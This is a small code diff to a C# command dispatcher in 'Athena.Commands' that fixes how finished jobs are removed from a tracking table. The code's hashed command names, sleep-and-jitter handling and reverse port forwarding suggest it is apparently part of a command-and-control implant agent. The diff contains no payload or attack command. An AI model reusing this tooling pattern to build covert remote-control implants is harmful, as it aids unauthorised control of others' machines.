@@ -141,7 +141,8 @@ namespace Athena.Commands
                         break;
                     }
 
-                    StopRportFwd(this, new TaskEventArgs(job));  
+                    StopRportFwd(this, new TaskEventArgs(job));
+                    TaskResponseHandler.activeJobs.TryRemove(task.id, out _);
                     break;
                 case "C9FAB33E9458412C527C3FE8A13EE37D": //sleep
                     UpdateSleepAndJitter(job);
@@ -194,10 +195,8 @@ namespace Athena.Commands
                     if(rr is not null)
                     {
                         TaskResponseHandler.AddResponse(rr.ToJson());
-                        TaskResponseHandler.activeJobs.Remove(task.id, out _);
-
                     }
-
+                    TaskResponseHandler.activeJobs.TryRemove(task.id, out _);
                     break;
             }
             if (task.token != 0)
